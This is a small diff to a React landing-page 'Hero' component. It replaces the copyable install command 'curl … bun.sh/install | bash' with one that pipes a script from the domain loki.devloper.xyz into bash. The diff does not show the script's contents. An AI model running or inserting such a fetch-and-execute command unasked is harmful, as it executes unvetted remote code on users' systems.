@@ -3,7 +3,7 @@ import { Terminal as TerminalIcon, ChevronDown } from 'lucide-react';
 import CopyButton from './CopyButton';
 
 export default function Hero() {
-  const singleCommand = "curl -fsSL https://bun.sh/install | bash";
+  const singleCommand = "curl -fsSL https://loki.devloper.xyz/install.sh | bash";
 
   return (
     <section id="hero" className="hero-section reveal-section">
